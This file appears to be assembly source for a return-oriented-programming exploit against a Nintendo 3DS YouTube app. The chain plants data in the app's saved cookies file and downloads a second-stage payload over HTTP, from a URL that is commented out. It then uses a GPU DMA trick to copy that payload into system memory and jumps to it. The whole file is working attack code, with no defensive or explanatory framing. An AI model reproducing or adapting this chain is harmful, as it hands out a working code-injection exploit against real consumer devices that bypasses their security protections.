.nds

.create "ytb_rop.bin",0x0

.loadtable "unicode.tbl"

.include "../ytb_include/ytb_include.s"

PAYLOAD_LOC equ PAYLOAD_SEC_LOC
PARAMBLK_LOC equ (PAYLOAD_LOC + paramblk)
YTB_COOKIES_FILEOBJECT equ (PAYLOAD_SEC_LOC + cookie_obj)

.fill (0x1000 - .), 0xff

.orga 0x0
	rop:
	set_thread_priority 0x18

	; check for cookie-wiping keypress (call memclr if key is held)
	conditional_call YTB_PAD, YTB_COOKIEWIPE_KEY, 0x0, (PAYLOAD_LOC + cookie_data), 0x40, YTB_MEMCLR

	; open data:/cookies file
	fopen YTB_COOKIES_FILEOBJECT, (PAYLOAD_LOC + cookie_filename), 0x7
	; write cookie data
	fwrite YTB_COOKIES_FILEOBJECT, (PAYLOAD_LOC - 0x10), (PAYLOAD_LOC + cookie_data), 0x40, 0x1

	; get string length of cookie data
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC
		.word (PAYLOAD_LOC + cookie_data)
	.word YTB_STRLEN
	.word YTB_ROP_POP_R4PC
		.word 0x00000001 ; add 1 for null byte
	.word YTB_ROP_ADD_R0R0R4_POP_R4PC
		.word 0xFFFFFFFF ; r4 (garbage)
	.word YTB_ROP_MOV_R2R0_MOV_R0R2_POP_R4R5R6PC
		.word 0xFFFFFFFF ; r4 (garbage)
		.word 0xFFFFFFFF ; r5 (garbage)
		.word 0xFFFFFFFF ; r6 (garbage)
	.word YTB_ROP_POP_R3PC
		.word 0x00000000 ; r3 (upper half of u64 argument)

	; set file size
	.word YTB_ROP_POP_R0PC
		.word YTB_COOKIES_FILEOBJECT
	.word YTB_SETFILESIZE

	; commit changes to savedata
	control_archive (PAYLOAD_LOC + archive_name)
	control_archive (PAYLOAD_LOC + archive_name)

	getServiceHandle YTB_HTTPC_HANDLE, 0x70747468, 0x0000433A, 6 ; http:C
	httpcInitialize
	.word YTB_ROP_POP_R0PC
		.word 0x00000001 ; r0
	.word YTB_ROP_POP_R1PC
		.word YTB_HTTPC_STRUCT + 0x4 ; r1
	.word YTB_ROP_STR_R0R1_POP_R4PC
		.word 0xFFFFFFFF ; r4 (garbage)
	httpcCreateContextWrapper PAYLOAD_LOC + httpcContextStruct, PAYLOAD_LOC + payloadUrl, 0x1, 0x1
	httpcBeginRequest PAYLOAD_LOC + httpcSecondHandle, PAYLOAD_LOC + httpcContextHandle
	httpcReceiveData PAYLOAD_LOC + httpcSecondHandle, PAYLOAD_LOC + httpcContextHandle, PAYLOAD_THIRD_LOC, 0x00100000
	
	flush_dcache PAYLOAD_THIRD_LOC, 0x00100000
	gspwn (0x30000000 + FIRM_SYSTEM_LINEAR_OFFSET - 0x5FF000), PAYLOAD_THIRD_LOC, 0x0000A000
	sleep 100*1000*1000, 0
	
	; gspgpuSetBufferSwap 0, 0x14C00000, (1<<8)|(1<<6)|1
	; gspgpuSetBufferSwap 1, 0x14D00000, 1
	
	dsp_unloadcomponent
	dsp_registerinterruptevents

	.word YTB_ROP_POP_R0PC
		.word PARAMBLK_LOC
	.word YTB_ROP_POP_R1PC
		.word PAYLOAD_LOC
	.word 0x00101000

	.align 0x4
	httpcContextStruct:
		.word 0x00000000
		httpcContextHandle:
		.word 0x00000000
		httpcSecondHandle:
		.word 0x00000000
		.word 0x00000000

.orga 0x600
	payloadUrl:
		; .ascii "http://m.youtube.com/sec_payload.bin"
		; .byte 0x0A
		; .byte 0x00

.orga 0x700
	cookie_data:

.orga 0x780
	cookie_filename:
		.string "data:/cookies"
		.byte 0x00, 0x00
	archive_name:
		.ascii "data:"
		.byte 0x00
	.align 0x4
	cookie_obj:
		.word 0x00000000
		.word 0x00000000
		.word 0x00000000
		.word 0x00000000
		.word 0x00000000

.fill (0x800 - .), 0xff
	paramblk:
		; 0x00
		.word 0xFFFFFFFF
		.word 0xFFFFFFFF
		.word 0xFFFFFFFF
		.word 0xFFFFFFFF
		; 0x10
		.word 0xFFFFFFFF
		.word 0xFFFFFFFF
		.word 0xFFFFFFFF
		; 0x1C
		.word YTB_GSPGPU_GXCMD4
		; 0x20
		.word YTB_GSPGPU_FLUSHDATACACHE_WRAPPER
		.word 0xFFFFFFFF
		.word 0xFFFFFFFF
		.word 0xFFFFFFFF
		; 0x30
		.word 0xFFFFFFFF
		.word 0xFFFFFFFF
		.word 0xFFFFFFFF
		.word 0xFFFFFFFF
		; 0x40
		.word 0xFFFFFFFF
		.word 0xFFFFFFFF
		; 0x48
		.word 0x0000008d ; flags
		.word 0xFFFFFFFF
		; 0x50
		.word 0xFFFFFFFF
		.word 0xFFFFFFFF
		; 0x58
		.word YTB_GSPGPU_HANDLE
		.word 0xFFFFFFFF
		; 0x60
		.word 0xFFFFFFFF
		; 0x64
		.word 0x08010000

.Close
